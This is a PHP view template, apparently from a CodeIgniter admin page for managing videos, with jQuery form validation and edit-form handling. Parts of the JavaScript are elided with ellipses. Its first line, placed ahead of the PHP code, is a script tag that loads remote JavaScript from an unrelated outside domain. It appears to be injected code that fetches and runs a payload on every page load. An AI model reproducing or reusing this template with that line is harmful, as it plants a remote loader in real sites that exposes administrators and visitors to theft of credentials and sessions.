<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->video;$data['focus']=$this->judul; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->video,$baseView); ?>



<script>
    var urlLocal    = `${strSection}/${strVideo}/`;
    ...
    formInput.validate({
        rules: {
            judul: {required: true,remote: {url: `${strVideo}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
            link:{required:true},
    ...
    function ubah(id) {
        ...
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                ...
                setFocus(strJudul);
                var dataSet = [strId,strJudul,strStatus,strLink];
                dataSet.forEach(function(row){setIdSelect(row,data[row]);});
                setFileImage(data[strGambar],strVideo);
            } else {
                notif(strFailed);
            }
        });
